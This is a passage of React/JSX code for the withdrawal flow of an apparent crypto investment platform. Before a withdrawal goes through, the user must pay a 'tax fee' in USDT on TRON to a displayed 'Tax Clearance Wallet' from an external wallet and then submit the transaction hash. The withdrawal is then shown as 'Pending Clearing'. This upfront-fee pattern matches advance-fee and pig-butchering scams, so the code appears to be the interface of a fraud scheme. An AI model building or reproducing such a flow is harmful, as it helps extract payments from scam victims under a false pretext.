                    <div className="w-24 h-24 bg-white p-2 rounded-xl flex items-center justify-center shrink-0">
                      <img
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${taxFeeWallet}`}
                        alt="Tax Fee QR Code"
                        className="w-full h-full object-contain"
                      />
                    </div>
                    <div className="min-w-0 space-y-2 w-full">
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-white/60 font-medium">Tax Clearance Wallet (TRC20)</span>
                        <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">USDT / TRON</span>
                      </div>
                      <div className="p-2.5 bg-black/70 rounded-xl border border-white/10 flex items-center justify-between gap-2">
                        <span className="text-xs font-mono text-white/90 truncate">{taxFeeWallet}</span>
                        <button
                          type="button"
                          onClick={() => handleCopyFeeAddress(taxFeeWallet)}
                          className="p-1.5 bg-[#B0F127] text-black rounded-lg hover:bg-[#9ee016] transition-all shrink-0"
                        >
                          {copiedFeeWallet ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>
                  </div>
                  <p className="text-[11px] text-amber-300/80 bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-xl text-center">
                    Note: Tax fee cannot be deducted from your account balance. Transfer from an external wallet.
                  </p>
                </div>

                <form onSubmit={handleFinalizeBankWithdrawal} className="space-y-4">
                  <div className="space-y-1.5">
                    <label className="text-xs text-white/60">Tax Payment Transaction Hash (TxID)</label>
                    <input
                      type="text"
                      required
                      placeholder="Paste external transfer TxHash (0x... or Hash ID)"
                      value={taxFeeHash}
                      onChange={(e) => setTaxFeeHash(e.target.value)}
                      className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                    />
                  </div>

                  {feedback && (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 shrink-0" />
                      <span>{feedback.message}</span>
                    </div>
                  )}

                  <div className="flex gap-3">
                    <button type="button" onClick={() => setStep('2B')}
                      className="w-1/3 py-3 bg-white/5 hover:bg-white/10 text-white font-semibold text-xs rounded-xl border border-white/10 transition-all"
                    >Back</button>
                    <button type="submit" disabled={submitting}
                      className="w-2/3 py-3 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2 disabled:opacity-50"
                    >
                      {submitting ? 'Verifying Tax Payment...' : 'I Have Paid Tax Fee'}
                    </button>
                  </div>
                </form>
              </div>
            )}

            {/* ── STEP 4: Confirmation Screen ───────────────────────────── */}
            {step === 4 && (
              <div className="text-center py-6 space-y-5 animate-fade-in">
                <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
                  <Clock className="w-8 h-8 animate-pulse" />
                </div>

                <div className="space-y-2">
                  <h3 className="text-2xl font-bold text-white">Withdrawal Pending</h3>
                  <p className="text-xs text-white/60 max-w-sm mx-auto leading-relaxed">
                    Your withdrawal request and fee verification have been submitted. Check back later for status updates.
                  </p>
                </div>

                <div className="p-4 bg-black/50 border border-white/10 rounded-2xl text-left space-y-2 text-xs font-mono">
                  <div className="flex justify-between text-white/60">
                    <span>Method:</span>
                    <span className="text-white font-bold">
                      {method === 'CRYPTO' ? `Crypto (${cryptoAsset} ${cryptoNetwork})` : `Local Bank (${localCurrency})`}
                    </span>
                  </div>
                  <div className="flex justify-between text-white/60">
                    <span>Withdrawal Amount:</span>
                    <span className="text-[#B0F127] font-bold">
                      ${(method === 'CRYPTO' ? numCryptoAmount : bankWithdrawAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                  {method === 'LOCAL_BANK' && (
                    <div className="flex justify-between text-white/60">
                      <span>Destination:</span>
                      <span className="text-white font-bold">{bankName} ({accountNumber.slice(-4)})</span>
                    </div>
                  )}
                  {method === 'CRYPTO' && (
                    <div className="flex justify-between text-white/60">
                      <span>Destination:</span>
                      <span className="text-white font-bold">{destinationWallet.slice(0, 8)}...{destinationWallet.slice(-6)}</span>
                    </div>
                  )}
                  <div className="flex justify-between text-white/60 pt-1 border-t border-white/5">
                    <span>Status:</span>
                    <span className="text-amber-400 font-semibold flex items-center gap-1">
                      <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
                      Pending Clearing
                    </span>
                  </div>
                </div>

                <button
                  onClick={handleResetAndClose}
                  className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md"
                >
                  Return to Dashboard
                </button>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  )
}
